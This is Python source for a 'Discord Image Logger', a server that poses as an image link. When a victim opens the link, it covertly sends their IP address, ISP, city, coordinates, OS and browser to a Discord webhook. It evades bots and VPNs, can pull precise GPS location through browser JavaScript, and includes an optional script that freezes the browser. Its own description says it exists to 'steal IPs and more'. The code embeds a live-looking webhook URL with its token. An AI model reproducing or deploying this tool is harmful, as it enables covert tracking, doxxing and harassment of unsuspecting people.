# Discord Image Logger
# By Dexty | https://github.com/xdexty0

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "Dexty"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1398562155346788445/n_WEpeZwXObxaj1U-SLVpuLYHkODGJ_BIoypQG689JVlOyQFuWhjKdESPJuW9oYafo6F",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/xdexty0/Chromebook-Crasher)
    
    "accurateLocation": true, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by Dexty's Image Logger. https://github.com/xdexty0/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/xdexty0

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
